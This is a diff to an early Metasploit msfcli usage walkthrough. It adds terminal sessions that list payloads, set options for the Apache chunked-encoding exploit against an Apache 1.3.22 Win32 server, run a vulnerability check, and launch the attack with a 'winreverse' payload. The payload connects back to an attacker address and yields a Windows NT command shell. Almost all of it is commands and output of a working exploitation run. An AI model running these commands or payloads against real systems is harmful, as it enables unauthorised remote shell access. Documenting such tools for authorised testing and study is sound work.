@@ -22,6 +22,7 @@ hdm@slasher framework $ ./msfcli
   0x0e  War-FTPD 1.65 PASS Overflow
 
 
+
 2) Display the information for the selected exploit
 
 hdm@slasher framework $ ./msfcli 0x01 S
@@ -65,14 +66,93 @@ References:
 
 
 
-3) Show available payloads
+3) Show the available payloads
+
+hdm@slasher framework $ ./msfcli 0x01 P
+                                                                                                                
+Metasploit Framework Usable Payloads
+====================================
+                                                                                                                
+  winadduser    Create admin user X with pass X
+  winbind       Listen for connection and spawn a shell
+  winreverse    Connect back to attacker and spawn a shell
+                                                                                                                
+
+
+4) Choose a payload and show the new combined option set
+
+hdm@slasher framework $ ./msfcli 0x01 PAYLOAD=winreverse O
+                                                                                                                
+Exploit and Payload Options
+===========================
+                                                                                                                
+  Exploit:    Name      Default    Description
+  --------    ------    -------    ------------------
+  optional    SSL                  Use SSL
+  required    RHOST                The target address
+  required    RPORT     80         The target port
+                                                                                                                
+  Payload:    Name        Default    Description
+  --------    --------    -------    ------------------------------------------
+  optional    EXITFUNC    seh        Exit technique: "process", "thread", "seh"
+  required    LHOST                  Local address to receive connection
+  optional    PREFORK                Execute payload in forked process
+  required    LPORT                  Local port to receive connection
+                                                                                                                
+
+
+5) Some exploits and payloads include an advanced option set
+
+hdm@slasher framework $ ./msfcli 0x01 PAYLOAD=winreverse A
+                                                                                                
+Exploit and Payload Advanced Options
+====================================
+                                                                                                                
+  Payload (Msf::Payload::win32_reverse):
+  --------------------------------------
+                                                                                                                
+  Exploit (Msf::Exploit::apache_chunked_win32):
+  ---------------------------------------------
+
+(this one does not)                                                                                             
 
 
 
-4) Pick a payload and show options
+6) List the available targets and optionally select one
 
+hdm@slasher framework $ ./msfcli 0x01 PAYLOAD=winreverse T
+                                                                                                                
+Supported Exploit Targets
+=========================
+                                                                                                                
+  0  Windows NT/2K Brute Force
+  1  Windows 2000
+  2  Windows NT
+
+                                                                                             
 
 5) Fill in options and try a vulnerability check
 
-6) Launch the exploit
+hdm@slasher framework $ ./msfcli 0x01 \
+PAYLOAD=winreverse RHOST=192.168.1.241 RPORT=8080 \
+LHOST=192.168.1.244 LPORT=5555 TARGET=2 C
+
+[*] Vulnerable server 'Apache/1.3.22 (Win32)'
+
+
+
+6) Launch the actual exploit :)
+
+hdm@slasher framework $ ./msfcli 0x01 \
+PAYLOAD=winreverse RHOST=192.168.1.241 RPORT=8080 \
+LHOST=192.168.1.244 LPORT=5555 TARGET=2 E
+
+[*] Trying to exploit Windows NT using return 0x1c0f1022 with padding of 348...
+[*] Trying to exploit Windows NT using return 0x1c0f1022 with padding of 352...
+[*] Connection from 192.168.1.241:1033...
+                                                                                                                
+Microsoft(R) Windows NT(TM)
+(C) Copyright 1985-1996 Microsoft Corp.
+                                                                                                                
+c:\program files\apache group\apache>
 
